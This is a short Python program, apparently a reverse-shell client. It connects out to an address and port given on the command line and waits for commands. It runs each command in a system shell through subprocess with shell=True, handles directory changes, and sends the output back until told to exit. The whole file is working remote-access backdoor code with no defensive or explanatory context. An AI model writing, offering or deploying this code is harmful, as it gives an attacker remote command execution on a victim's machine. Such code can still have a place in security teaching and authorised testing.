import socket
import subprocess
import os
import sys

#inbound function
def inbound():
    print('[+] Awaiting response... ')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            return(message)
        except Exception:
            sock.close()

def outbound(message):
    response = str(message).encode()
    sock.send(response)

def session_handler():
    print(f'[+] Connecting to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}')
    while True:
        message = inbound()
        print(f'[+] Message received - {message}')

            #Exit message handling
        if message == 'exit':
            print('[-] The server has terminated the session.  Bye bye.')
            sock.close()
            break
            #Change directory script
        elif message.split(" ")[0] =='cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                sock.send(cur_dir.encode())
            except FileNotFoundError:
                outbound('Invalid directory.  Try again')
                continue
                
        else:
            #Subprocess command handling
            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            sock.send(output)

if __name__ == '__main__':  
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        session_handler()
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
    except Exception as e:
        print(e)
        

